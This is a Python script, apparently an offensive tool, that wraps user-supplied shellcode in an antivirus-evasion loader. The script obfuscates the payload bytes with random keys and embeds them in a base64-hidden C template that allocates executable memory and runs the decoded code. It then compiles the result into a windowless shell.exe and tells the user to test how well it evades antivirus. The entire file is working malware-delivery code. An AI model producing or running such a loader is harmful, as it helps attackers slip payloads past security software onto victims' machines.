import os
import sys
import re
import random
import json
import base64

code = 'I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxXaW5kb3dzLmg+CiNpbmNsdWRlIDx0aW1lLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KCi8qJCQkKi8KCmludCBsZW4gPSBzaXplb2YodjMpIC8gc2l6ZW9mKCp2Myk7CgppbnQgbWFpbigpCnsKICAgIGNoYXIgYXJyYXlbc2l6ZW9mKHYzKSAvIHNpemVvZigqdjMpXSA9IHswfTsKICAgIHZvaWQgKmNjYyA9IFZpcnR1YWxBbGxvYygwLCBzaXplb2YgYXJyYXksIE1FTV9DT01NSVQsIFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpOwogICAgZm9yIChpbnQgaSA9IDA7IGkgPCBsZW47IGkrKykKICAgIHsKICAgICAgICBzd2l0Y2ggKGkgJSAzKQogICAgICAgIHsKICAgICAgICBjYXNlIDA6CiAgICAgICAgICAgIHYzW2ldIF49IGlwc1tpICUgM107CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGNhc2UgMToKICAgICAgICAgICAgdjNbaV0gLT0gaXBzW2kgJSAzXTsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgY2FzZSAyOgogICAgICAgICAgICB2M1tpXSArPSBpcHNbaSAlIDNdOwogICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlIDM6CiAgICAgICAgICAgIHYzW2ldIC89IGlwc1tpICUgM107CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgIH0KCiAgICBpbnQgbnVtPSh1bnNpZ25lZCl0aW1lKE5VTEwpOwogICAgc3JhbmQobnVtKTsKICAgIGZvcihpbnQgdj0wO3Y8bGVuO3YrPTEwKXsKICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IDUwMDA7IGkrKykgewogICAgICAgICAgICBudW0gPSByYW5kKCklMTA7CiAgICAgICAgICAgIGFycmF5Wyh2K251bSkgJSBsZW5dID0gdjNbKHYrbnVtKSAlIGxlbl07CiAgICAgICAgICAgIHNyYW5kKHJhbmQoKSk7CiAgICAgICAgfQogICAgfQogICAgbWVtY3B5KGNjYywgYXJyYXksIHNpemVvZiBhcnJheSk7CiAgICAoKHZvaWQgKCopKCkpY2NjKSgpOwogICAgcmV0dXJuIDA7Cn0='

ips = []
for i in range(4):
    ips.append(random.randint(0,250))

payloadfile = r'payload.c'

if not os.path.isfile(payloadfile):
    print("未在当前目录检测到payload")
    path = input("请输入payload.c绝对路径(默认读取当前目录):\n")
    if len(path) > 0:
        payloadfile = path

if not os.path.isfile(payloadfile):
    print("payload不存在")
    sys.exit(0)

payloadstr = ''
with open(payloadfile,"r") as f:
    content = f.read()
    result = re.findall(r'\\x(\w\w)', content)
    for i in result:
        payloadstr += i
    # print(payloadstr)

v1 = []
v2 = []
for i in range(len(result)):
    num = int(result[i],16)
    v2.append(num)
    index = i % 3
    if index == 0:
        v1.append(num ^ ips[index])
    elif index == 1:
        v1.append(num + ips[index])
    elif index == 2:
        v1.append(num - ips[index])
    elif index == 3:
        v1.append(num * ips[index])

def ListToStr(list):
    str = json.dumps(list)
    str = str.replace("[","{").replace("]","}")
    return str

with open("shell.c","w",encoding="utf-8") as f:
    payload = ""
    payload += 'int v3[] = %s;\n'%ListToStr(v1)
    payload += 'int ips[] = %s;\n'%ListToStr(ips)
    
    content = base64.b64decode(code).decode()
    content = content.replace("/*$$$*/",payload)
    f.seek(0)
    f.write(content)
    
if os.system("tcc -v") == 0:
    print("~使用tcc编译~")
    os.system("tcc shell.c -Wl,--subsystem,gui")
    print("shell.exe编译成功，请自行测试免杀效果")
    os.remove("shell.c")
elif os.system("gcc -v") == 0:
    print("~使用gcc编译~")
    os.system("gcc shell.c -mwindows -o shell.exe -O3")
    print("shell.exe编译成功，请自行测试免杀效果")
    os.remove("shell.c")
else:
    print("编译器不存在，请手动编译")
input("~执行完成~\n按任意键退出...")